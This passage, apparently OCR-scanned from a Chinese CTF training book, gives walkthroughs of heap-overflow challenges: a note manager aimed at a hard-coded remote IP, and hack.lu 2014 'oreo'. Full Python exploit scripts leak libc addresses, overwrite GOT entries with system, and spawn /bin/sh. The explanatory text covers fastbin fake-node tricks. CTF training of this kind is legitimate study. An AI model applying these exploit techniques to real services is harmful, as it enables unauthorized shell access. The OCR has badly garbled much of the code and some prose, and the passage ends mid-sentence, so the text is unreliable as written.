frompwnimport*
#ip =1.192.225.129
#target="/note2"
target=("115.28.27.103",9002)
def get_io(target):
r_m=COLORED（RAW,“green")
w_m=COLORED（RAW,“blue")
io=zio(target,timeout =9999,print_read =r_m,print_write =w_m)
return io
defnew_note(io,length_t,content_t):
io.read until("option--->>\n")
io.writeline("1")
io.read_until("content:(less than 128)in")
io.writeline(str(length_t))
io.read_until("content:\n")
io.writeline(content_t)
def show_note(io,id_t):
io.read_until("option--->>in")
io.writeline("2")
io.read_until(id of the note:In")
---
## Page 518
CTF特训营：技术详解、解题方法与
13.4真题解析
518/1144
io.writeline(str(id_t))
def delete_note(io,id_t）:
io.readuntil("option--->>in")
io.writeline("2")
io.read_until("id of the note:In")
io.writeline(str(id_t)
def edit note(io,idt,type_t,content_）：
io.read_until("option--->>in")
io.writeline("3")
io.read _until("id of the note:in")
io.writeline(str(id_t))
io.read_until(*[1.overwrite/2.append]in")
io.writeline(str(type_t))
io.read_until("Contents:")
io.writeline(content_t)
def pwn(io):
name_addr=0x6020E0
address_addr=0x602180
address='aaa'
name = 164(0x20)+164(0x21)
name =name.ljust(0x20,a)
name +=|64(0x20)+164(0x21)
name +=164(0x0)
io.read_until("lnput your name:In")
io.writeline(name)
io.read_until(*lnput your address:ln")
io.writeline(address)
new_note(io,0,")
new_note（io,0x80,)
atoi_got=0x0000000000602088
manage_addr=0x602120
payload=a'*0x10
for i in range(7):
edit_note(io, 0,2, payload)
payload=a²*Oxf
edit_note(io,0,2,payload）)
payload=’a'+I64（name_addr+0x10）
edit_note(io,0,2,payload)
io.gdb_hint()
new_note(io,0,")
payload=’a'*0x10
foriin range(2):
edit_note(io,2,2,payload)
payload=’a²*Oxf
---
## Page 519
CTF特训营：技术详解、解题方法与
13.4真题解析
519/1144
edit_note(io,2,2,payload)
payload =’a’+164（atoi_got)
edit_note(io,2,2,payload)
show_note(io,0)
io.read_until(Content is)
data =io.read_until(n")[:-1]
print [c for c in data]
data =data.ljust（8,x00)
aoti addr=|64(data)
print"aoti_addr:",hex(aoti addr)
elf_info =ELF("./libc-2.19.so")
#elf info=ELF(./libc.so.6")
atoi_offset = elf_info.symbols["atoi"]
system_offset = elf_info.symbols[system"]
libc_base=aoti_addr-atoi_offset
system_addr = libc_base + system_offset
content=164（system addr）
print“system_addr:",hex(system_addr)
edit _note（io,0,1,content)
io.read_until("option--->>\n")
io.writeline("/bin/sh")
io.interact()
io=get_io（target)
pwn(io)
3.{hack.lu-2014}oreo（PWN400)
（1）题目说明
这道题的逻辑还是比较简单的，简单来说其就是一个订单系统
不过所订的东西是rifle，从操作方式来看，这就是最基本的菜单题
完成的是添加购物单和提交购物单的需求。
（2）结构说明
---
## Page 520
CTF特训营：技术详解、解题方法与
13.4真题解析
520/1144
订单结构体如图13-26所示。
|rifle_node_struc struc ；（sizeof=θx38)
|description
db25dup（？)
name
db 27 dup（？)
next
dd?
;offset
rifle_node_struc ends
图13-26
oreo结构体
(3）漏洞位置
在添加订单时，没有限制好name和description的长度，都是56
从而导致溢出覆盖，如图13-27所示。
根据杨坤博士的PPT一—《掘金CTF》来进行理解，申请56字节
的堆空间，加上pre_size和size刚好是64字节，属于fastbin，是一个
单链表结构，如图13-28所示。
canary=MKFP（GS，20）;
tmp_ptr = head_ptr_804A288;
head_ptr_804A288 =（rifle_node_struc *)nalloc(56u);
if （head_ptr_804A288）
r
head_ptr_804A288->next -tnp_ptr;
printf("Rifle nane:");
fgets(head_ptr_804A288->nane,56,stdin);
set_end_char_80485Ec(head_ptr_804A288->nane);
printf("Rifle description: ");
fgets(head_ptr_804A288->description,56,stdin);
set_end_char_80485Ec(head_ptr_804A288->description);
++add_count_804A2A4;
---
## Page 521
CTF特训营：技术详解、解题方法与
13.4真题解析
521/1144
图13-27溢出关键点反编译代码
0
0x804b030
prev_size
size=32
fd=0x8048010
bk
unused
prev_size
size=32
Fd=NULL
bk
unused
---
## Page 522
CTF特训营：技术详解、解题方法与
13.4真题解析
522/1144
图13-28fastbin链表
因此只要布置好溢出的数据，就可以控制后续分配的堆块。
注意fastbin中的size域必须与其对应的bin保持一致，否则申请会
报错。
根据上述要求，直接覆盖got表不太现实，因为size域要设置成
0x41比较难实现，所以考虑提供一个留言的功能，其中留言的指针
和buff都是全局变量，同时并设置message=&message_buff[128]。想
清楚这一点，本题的考点就很明显了。而且这个指针的前两个int域刚
好就是提交的数量和预订的数量，只要设置好数量，这个地址就可以
用来作为fastbin中的fakenode，如图13-29所示。
0804A288
0804A28C
align 20h
0804A2A0 order_count_804A2A0 dd ?
0804A2A0
0804A2A4add_c0unt_804A2A4dd？
08 04A2A4
0804A2A8 ；char*meS5age_804A2A8
0804A2A8 me55age_804A2A8 dd ?
08 04A2A8
08 04A2AC
align 20h
0804A2c0；char message_buff_804A2c0[128]
0804A2c0 mes5age_buff_804A2Cθ db 80h dup（?)
0804A2C0_bSS
ends
---
## Page 523
CTF特训营：技术详解、解题方法与
13.4真题解析
523/1144
图13-29fakenode的选址
（4）信息泄露
在覆盖之前要先泄露地址，可以控制订单表的nex指针来控制信
息的泄露。这里通过布置好name中的数据，用scanfgot处的值覆盖
next指针的内容，构成下一个订单node，而且这里scanfgot的next指
针处的值是全零的，刚好能够作为链表结束的标志。
（5）利用过程
由于很多打印都没有n，所以信息不会马上返回，但是在几个关
键的地方还是有\n的，所以对于泄露信息和覆盖并无影响。
先申请0x41-count_lef个订单（malloc），然后提交（释放），制
造好连续的fastbin，并且使message前面的size域先做好准备（后面
还要申请几个节点，所以这里要减掉count_left）。
接着申请一个节点，利用name溢出布置好next指针，以便于泄
露scanf的真实地址。再通过Showrifle功能打印两个节点（一个真实
的节点，一个虚假的节点）。
然后申请一个节点，利用name溢出，将next设置为ox0，同时布
---
## Page 524
CTF特训营：技术详解、解题方法与
13.4真题解析
524/1144
置好连续的后续堆块，因为后面申请的就是与该节点连着的堆块了，
将后面堆块的fd域设置为message指针-0x8字节的位置，这时候
message指针的位置刚好是rifle结构体的name域。程序结构与堆块结
构的混淆利用如图13-30所示。
prev_size
size=32
fd=0x8048010
bk
unused
prev_size
size=32
Fd=NULL
图13-30程序结构与堆块结构的混淆利用
再次申请一个节点，此时申请的节点是正常的，同时fastbin中
---
## Page 525
CTF特训营：技术详解、解题方法与
13.4真题解析
525/1144
的头结点会被设置成message-0x8的位置。
第四次申请节点时，malloc分配出来的值就是message-0x8，此
时message指针就是name域，将name设置为scanfgot的值。
留言，就是写入message指针中的地址，前面已经将这个指针改
为scanfgot，所以这里直接发送systemrealaddr就可以将scanf覆盖
成system了。
最后发送/bin/sh；in，会调用scanf进行转换，相当于调用了
system（"/bin/sh;\n"），最终拿到shell。
具体代码如下：
from zio import *
frompwn import*
target="./oreo”
elf _path ="./oreo”
def get_io(target):
r_m=COLORED（RAW,“green")
w_m=COLORED（RAW,“blue")
io=zio（target,timeout=9999,print_read=r_m,print_write=w_m)
#io=process（target,timeout =9999,shell=True)
return io
def get_elf_info(elf_path):
return ELF(elf_path)
def add_new_rifle(io,name,description):
#print io.read_until(banner)
io.write("1\n")
#io.read_until("Rifle name:")
io.write(name +"In")
#io.read_until("Rifle description:“")
---
## Page 526
CTF特训营：技术详解、解题方法与
13.4真题解析
526/1144
io.write（description +"n")
def show_rifle(io):
#print io.read_until(banner)
io.write("2\n")
def order_rifle(io):
#io.read_until(banner)
io.write("3in")
def leave_message(io,message):
#io.readuntil(banner)
io.write("4\n")
#io.readuntil("Enter any notice you'd like to submit with your order:")
io.write(message +"n")
def show_cur_stats(io):
#io.read_until(banner)
io.write("5\n")
def pwn(io):
elf _info= get_elf_info（elf_path)
print io.read_until(6.Exit!\n")
scanf_got=0x0804a258
func_use_got = scanf_got
name=“pxx"
description =“nihao"
count left=3
foriinrange(0x41-count_left）:#set add_count_size =0x41
add_new_rifle(io,name,description）#node1
order_rifle(io)#deleteallnode
next_ptr=func_use_got
name=a*27+I32(next_ptr）#leak info
description ="description"
print len(description)
#io.gdb_hint()
add_new_rifle（io,name,description）#node1overwritenode2
show_rifle(io)
io.read_until("Description:“)
io.read_until("Description:“)
data =io.read(4)
print hex(32(data))
func_use_real_addr=I32(data）
offset
isoc99_sscanf=0x00061e10
offset_system=0x0003e800
---
## Page 527
CTF特训营：技术详解、解题方法与
13.4真题解析
527/1144
offset_func_use=offsetisoc99_sscanf
is_know=True
if is_know ==False:
offset_func_use =int(raw_input("offset_func_use:"),16)
offset_system=int（raw_input(offset_system:")，16)
libc_addr=func_use_real_addr-offset func_use
system_read_addr=libc_addr+offset_system
next_ptr=0x804a2a8-0x08#message_addrfakenode
name=“a*27+132（0x0)
name += I32(0x0)+132(0x41) +132(next_ptr)
description=“description"
print len(description)
add_new_rifle(io,name,description)#node1overwrite node2
name =“pxx”
add_new_rifle（io,name,description)#alloc node2set fakenode3
description=I32(func_use_got)
#io.gdb_hint()
add_new_rifle(io,name,description)#allocfakenode3
message=I32(system_read_addr)
leave_message(io,message)
io.write("/bin/sh;ln")
io.interact()
io=get _io（target)
(o)umd
4.{RCTF-2015}Shaxian（PWN400)
程序中定义的结构体大致如图13-31所示。
ACai
struc;（sizeof=0x28）
num
PP
name
()dnp ZE qP
next
PP
;offset
ACai
ends
图13-31shaxian结构体
---
## Page 528
CTF特训营：技术详解、解题方法与
13.4真题解析
528/1144
由图13-32可以看出，漏洞很明显，属于堆溢出，本来32字节的